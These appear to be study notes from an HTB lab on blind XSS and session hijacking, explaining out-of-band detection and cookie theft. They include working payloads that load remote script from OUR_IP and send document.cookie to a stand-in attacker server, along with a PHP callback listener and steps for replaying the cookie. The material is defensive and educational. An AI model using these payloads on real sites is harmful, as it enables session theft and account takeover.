## 1. What is Session Hijacking?

Modern web applications commonly use **cookies** to maintain a user's authenticated session.

Normally:

```text
User logs in
     ↓
Server creates session
     ↓
Browser stores session cookie
     ↓
Browser sends cookie with future requests
     ↓
Server recognizes the user
```

If an attacker obtains a victim's session cookie, they **may be able to access the victim's authenticated session without knowing the victim's password**.

This is known as:

- **Session Hijacking**
    
- **Cookie Stealing**
    

The key idea is:

> **The session cookie can act as proof that the browser is already authenticated.**

---

# 2. XSS + Session Hijacking

XSS becomes particularly dangerous here because JavaScript executes **inside the victim's browser**.

Conceptually:

```text
                 XSS
                  ↓
        JavaScript executes
                  ↓
        Browser-side data
                  ↓
        Session information
                  ↓
       Attacker-controlled server
```

In the lab scenario, the XSS vulnerability is used to demonstrate how session information could be transmitted to an authorized lab server.

---

# 3. Blind XSS

## What is Blind XSS?

A **Blind XSS** vulnerability is an XSS vulnerability where the payload executes somewhere that the attacker **cannot directly see**.

For example:

```text
Attacker
   ↓
Registration form
   ↓
Data stored
   ↓
Admin reviews submission
   ↓
XSS executes in Admin Panel
```

The attacker doesn't have access to the Admin Panel, so they don't directly see the result.

---

# 4. Common Blind XSS Locations

The material gives several examples:

- Contact Forms
    
- Reviews
    
- User Details
    
- Support Tickets
    
- HTTP `User-Agent` header
    

### Key point

Blind XSS is especially interesting when:

> **Your input is later viewed by another user with greater privileges.**

For example:

```text
Normal user
     ↓
Submits malicious input
     ↓
Admin views it
     ↓
Payload executes in Admin's browser
```

---

# 5. The `/hijacking` Lab

The lab contains a registration page:

```text
/hijacking/index.php
```

The form contains fields such as:

```text
Full Name
Username
Password
Email
Website
```

After registration, instead of displaying the submitted information back to you, the application says that an **Admin will review the registration request**.

Therefore:

```text
Your browser
     ↓
Registration form
     ↓
Server
     ↓
Admin Panel
     ↓
Admin browser
```

The important problem is:

> **You don't have access to the page where your input is eventually rendered.**

---

# 6. How Do We Detect Blind XSS?

With ordinary XSS, we can use something obvious like:

```html
<script>alert(window.origin)</script>
```

and visually see the result.

With Blind XSS:

```text
Payload executes
      ↓
But where?
      ↓
We cannot see the page
```

So we need an **out-of-band signal**.

The module's approach is to make the payload request something from our lab machine.

### Concept

```text
Admin browser
     ↓
XSS executes
     ↓
Requests resource
     ↓
Your lab server
     ↓
You see incoming request
```

If your server receives the request, that tells you that the JavaScript executed.

---

# 7. 🛰️ Blind XSS Detection Flow

![Image](https://images.openai.com/static-rsc-4/N4mYQ2R29ji3ZolqMj-G3O5tnn3hv6K2PbTm1bXvMKMOeGfh_A70BlPbe1vj9tI1vF_pZwU1GY0Ay73XwwrDO-5Gk2fKTUtFBK2Qky5xYRDwT4J5zYoIQJxaikDxMhTvI8u5gEybB3P1h9KSg9fa1X5JJIflE1TUBTonak6cFfAq3XeqSlMSXZ9QnGwCq1_-?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/l9vDJovUDaHfcCmDFxlDXQMvR3xF1sxhAYuAe2AaXAiZDmmMv6QoLNW_vRH-DhAQcgn8ezeIbNF_vMLNKwsqbh4-hSzZ4M513QHN1WfsfSpPA7HANwnHAbfH-S2LNDAxCHGte3YCE8lv-rFWNXyhu3gFjERRTIgV367z5WKrMpkmnyfxf6vcZUXPoOSUKMTK?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/lXE1cr23TO-x6BNQ1hPc7wnEaApiFdDpB40941iZ9V5wHL9oK3jmhn3U8zgqpwOOPscRIl0_9QShb7r6SVmHyv5Y7X_ZjlH-5BTlHBR48M4xP0q2-y3SF6SVQoNNUF1OM1pBxvQ2cjLsZ2qJSgkYbMb3amgyHCYDwMPyNmUKMep0PqCuQUpgB8rKOIXA7cFJ?purpose=fullsize)

```text
┌─────────────────┐
│     Attacker    │
│                 │
│ submits input   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Vulnerable Web  │
│ Application      │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Admin Panel   │
│                 │
│ Payload executes│
└────────┬────────┘
         │
         │ HTTP request
         ▼
┌─────────────────┐
│ Attacker's Lab  │
│ Server          │
└─────────────────┘
```

---

# 8. Remote JavaScript

One useful HTML feature is that a page can load JavaScript from another location:

```html
<script src="http://OUR_IP/script.js"></script>
```

Instead of putting the entire JavaScript payload inside the vulnerable input, the page loads a remote script.

Conceptually:

```text
Victim/Admin browser
        ↓
<script src=...>
        ↓
Requests script.js
        ↓
Your server
        ↓
JavaScript returned
        ↓
Browser executes it
```

---

# 9. Identifying the Vulnerable Field

The clever part of the lab is changing the requested resource according to the input field.

For example:

```html
<script src=http://OUR_IP/username></script>
```

If the server receives:

```text
GET /username
```

you know the payload in the **username** field executed.

Likewise:

```text
/fullname
/username
/website
```

can distinguish which field caused the callback.

### 🧠 Memory trick

> **The callback path becomes your label.**

```text
/username  → username field
/fullname  → fullname field
/website   → website field
```

---

# 10. Why This Is Useful

Without this technique:

```text
Several input fields
       ↓
One payload executes
       ↓
Which field caused it?
       ↓
Unknown
```

With field-specific callbacks:

```text
Several input fields
       ↓
Different callback paths
       ↓
Incoming request
       ↓
Exact vulnerable field identified
```

---

# 11. Different XSS Payloads

The source lists several remote-script techniques, including:

```html
<script src=http://OUR_IP></script>
```

and variations designed for different injection contexts.

It also shows JavaScript-based methods involving:

- Dynamically creating a `<script>` element
    
- `XMLHttpRequest`
    
- jQuery's `getScript()`
    

### Important lesson

There is **no universal XSS payload**.

A payload depends on:

```text
Injection point
      +
HTML context
      +
Filtering/sanitization
      +
Browser behavior
```

---

# 12. Starting the Lab Server

The module uses a simple PHP server as the callback server:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

The purpose here is simply to have a server capable of receiving the callback requests.

---

# 13. Testing the Fields

The methodology is:

```text
Start callback server
       ↓
Choose one XSS payload
       ↓
Put it in one field
       ↓
Submit form
       ↓
Wait for callback
       ↓
Check server
       ↓
Repeat for other fields
```

For example:

```text
fullname → callback?
username → callback?
website  → callback?
```

When a request arrives, record:

```text
Payload that worked
+
Input field that triggered it
```

---

# 14. Reducing the Number of Tests

The material points out that not every field necessarily needs to be tested.

### Email

The application validates the email format on both the front end and back end.

Therefore, malformed HTML/JavaScript input won't simply pass as a valid email.

### Password

The module suggests skipping password testing because passwords are normally hashed and aren't generally displayed in cleartext.

This reduces the number of fields requiring testing.

---

# 15. 🎯 Session Hijacking

Once the vulnerable field and working XSS technique are identified, the lab moves to **session hijacking**.

The conceptual chain becomes:

```text
Blind XSS
   ↓
Admin browser executes JavaScript
   ↓
JavaScript accesses browser data
   ↓
Data sent to lab server
   ↓
Attacker obtains session information
   ↓
Session can potentially be reproduced
```

---

# 16. Cookie Access

JavaScript can access cookies through:

```javascript
document.cookie
```

However, there's an important security distinction:

### Accessible cookie

```text
document.cookie
      ↓
JavaScript can potentially read it
```

### HttpOnly cookie

```text
HttpOnly
    ↓
Browser prevents JavaScript from reading it
    ↓
document.cookie cannot access it
```

**The supplied lab material demonstrates the former case.**

---

# 17. Sending Cookie Data

The source demonstrates two approaches:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

and:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

The second technique uses an image request so the browser makes an HTTP request without deliberately navigating the page away.

### Concept

```text
document.cookie
      ↓
Create request
      ↓
OUR_IP/index.php
      ↓
?c=<cookie>
```

---

# 18. Why `new Image()`?

The idea is:

```javascript
new Image().src = "...";
```

The browser creates an image object and requests the specified URL.

The page doesn't need to visibly navigate to the destination.

So conceptually:

```text
Normal navigation:

Victim page
    ↓
Navigate away
    ↓
Attacker server


Image request:

Victim page
    ↓
Create Image
    ↓
Background HTTP request
    ↓
Attacker server
```

---

# 19. Remote `script.js`

Instead of putting the complete JavaScript directly into the XSS injection, the lab stores the JavaScript in a remote file.

Conceptually:

```text
XSS payload
     ↓
<script src=".../script.js">
     ↓
Admin browser requests script.js
     ↓
Your server returns JavaScript
     ↓
JavaScript executes
```

This separates:

**XSS delivery mechanism**

from

**JavaScript functionality**

---

# 20. Server-Side Cookie Receiver

The lab then uses PHP to process the incoming parameter.

The PHP script:

1. Checks whether the cookie parameter exists.
    
2. Splits cookie data.
    
3. URL-decodes values.
    
4. Records the information.
    
5. Associates it with the source IP.
    

Conceptually:

```text
HTTP request
      ↓
GET ?c=...
      ↓
PHP
      ↓
Parse cookie data
      ↓
Write to file
```

The module uses:

```text
cookies.txt
```

for its lab demonstration.

---

# 21. Why Split Cookies?

A browser may have multiple cookies:

```text
cookie1=value1; cookie2=value2; cookie3=value3
```

The lab separates them:

```text
cookie1=value1
cookie2=value2
cookie3=value3
```

This makes the captured data easier to inspect.

---

# 22. Two Requests

When the payload executes, the lab expects two requests:

```text
Admin browser
      │
      ├──────────► /script.js
      │
      └──────────► /index.php?c=...
```

### Request 1

The browser downloads the JavaScript.

### Request 2

The JavaScript makes another request containing the cookie information.

This is an important detail for understanding how the attack works.

---

# 23. 🧩 Complete Blind XSS → Session Hijacking Chain

![Image](https://images.openai.com/static-rsc-4/CJ3ORops1ys7mepDrocFev6lYhmRYI7SYgzG0qpon2fn8_TlTKYKlxH0ODd4nYBB3JS9iyWAd3g6QZUEp5JL_fsYkwcWMRuynHUl_x7BrSCGTiKPn4y7VNpT6RPQ37HY1-ETxizxWeXu8YozQzQVHwrmzz8UjaC-rtccxfiBXGlTP9P47jwtmUOuSW4BrZDS?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/pGnXvTh5aCChUaVoJRcTitvhijvS7QMUQTAbgx6c5KfuJBGLjgKJ5GSZVxMsK5-wtPUNm_ZHfYw0X2ZhNCcOvwjNKYTwivRryORYICqws1-5irvPlwBxHNE5rM-67Ga9mIHtUFdGFFz8ZNAI7IuhZSxbTsXDn99hlMW9HBOmOWVT-TKqKr1NwdMx7BYhBqYx?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/20x7fLGj-oWDQFFyX_2Ce9qMdGLF-PzdsCWjEMd2urCz1T8IGo-VkHUjJAnZmz-oYmG4kn_2cWekVfbnqtrLTdxukhiOYwQnxSSxHQBaifVqlZ6JwXV5N1FPExhE0ltPISY_Qe1_KRi3WkBX8MkLGreiXYlS3qt6-W01ZCZpP4cvdYEx5u8AgHwJtgl2X6SD?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Z4PYiPYKS9rcMksoqZ5lrQSBqhM4vXFFXujAR0P3KyINCzN0Z7jqqDYZKX5pyL9FtwtPsAiaul4T8Bk4UgNCE2CMcFML6qx1CGp1gHIZ-Rvw2RFmZVrw9nmz6Vuk1tLjP6-PSkdb_eA5i6p3Lv0-SgF-ZjmZ731Kfbcjzd4DBmE01s6H5d-b1_ylul4KooC7?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/hBh6mWF24nk0lkWwvZnrDHNndNTkIkoWMAT7ftn7yp1rNaWOKXBz7TbJPJM0ULL6dhQX_PRmnKD9yd-Tgsj8OqVpYCwzcXUaevLX0brM-PTM3yQiCmTcc6dl7giUb2ZtLxMwrshj74K-Yt21hJN26k-u000QYju06vTOouM8RFp4tdNdvzIge9rN0xsz77ms?purpose=fullsize)

```text
                 ┌──────────────────┐
                 │ Attacker submits │
                 │ malicious input  │
                 └────────┬─────────┘
                          ↓
                 ┌──────────────────┐
                 │ Vulnerable Web   │
                 │ Application      │
                 └────────┬─────────┘
                          ↓
                 ┌──────────────────┐
                 │ Admin views data │
                 └────────┬─────────┘
                          ↓
                 ┌──────────────────┐
                 │ Blind XSS fires  │
                 └────────┬─────────┘
                          ↓
                 ┌──────────────────┐
                 │ Remote JS loaded │
                 └────────┬─────────┘
                          ↓
                 ┌──────────────────┐
                 │ Browser-side     │
                 │ session data     │
                 └────────┬─────────┘
                          ↓
                 ┌──────────────────┐
                 │ Lab server       │
                 │ receives data    │
                 └────────┬─────────┘
                          ↓
                 ┌──────────────────┐
                 │ Session may be   │
                 │ reproduced       │
                 └──────────────────┘
```

---

# 24. Using the Captured Cookie in the Lab

The module demonstrates placing the captured cookie into the browser's storage for the **authorized HTB lab**.

In Firefox, the material uses:

```text
Shift + F9
```

to access storage-related developer tooling.

Then the cookie is added using:

```text
Name  = part before "="
Value = part after "="
```

For example:

```text
cookie=f904f93c...
```

becomes conceptually:

```text
Name:  cookie
Value: f904f93c...
```

---

# 25. Final Lab Result

After setting the lab cookie and refreshing the page:

```text
Browser
   ↓
Sends session cookie
   ↓
Lab server recognizes session
   ↓
Authenticated session
```

The lab demonstrates that the browser can then appear as the victim/admin account.

The important security lesson is:

> **Authentication cookies must be protected because possession of a valid session token can sometimes be enough to authenticate without the user's password.**

---

# ⭐ Most Important Things to Remember

|Concept|Key Point|
|---|---|
|**Session Cookie**|Maintains an authenticated session|
|**Session Hijacking**|Using another user's valid session|
|**Cookie Stealing**|Obtaining session cookie data|
|**Blind XSS**|XSS executes somewhere you cannot directly see|
|**Out-of-band callback**|External request proves payload execution|
|**Remote JS**|`<script src=...>` loads JavaScript externally|
|**Field identification**|Callback path can identify vulnerable input|
|`document.cookie`|JavaScript-accessible cookie data|
|`new Image()`|Can generate an HTTP request|
|**PHP receiver**|Processes incoming lab requests|
|**HttpOnly**|Prevents JavaScript from reading a cookie|
|**Session token**|May be sufficient to authenticate|
|**Lab cookie replay**|Demonstrates the impact of stolen session data|

---

# 🧠 Super-Short Revision

```text
Blind XSS
   ↓
Don't see the vulnerable page
   ↓
Use an external callback
   ↓
Identify vulnerable input
   ↓
Load remote JavaScript
   ↓
Access browser-accessible session data
   ↓
Send it to the authorized lab server
   ↓
Demonstrate session replay
```

### The 3 concepts to lock in:

**1. Blind XSS:**

> _"My payload executes somewhere I can't see."_

**2. Out-of-band detection:**

> _"Make the victim's browser call my server so I know execution happened."_

**3. Session hijacking:**

> _"A stolen valid session token may allow access without knowing the password."_